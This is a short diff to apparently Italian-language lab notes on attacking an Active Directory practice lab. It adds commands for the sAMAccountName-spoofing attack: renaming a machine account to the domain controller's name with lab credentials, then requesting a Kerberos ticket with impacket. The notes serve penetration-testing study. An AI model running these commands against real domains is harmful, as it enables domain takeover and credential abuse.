@@ -123,3 +123,7 @@ Rinominiamo il computer a DCl (Da qui in poi non sono riuscito a fare l'exploit)
 ```bash
 python3 renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
 ```
+![[Pasted image 20230825170216.png]]
+```bash
+impacket-getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
+```
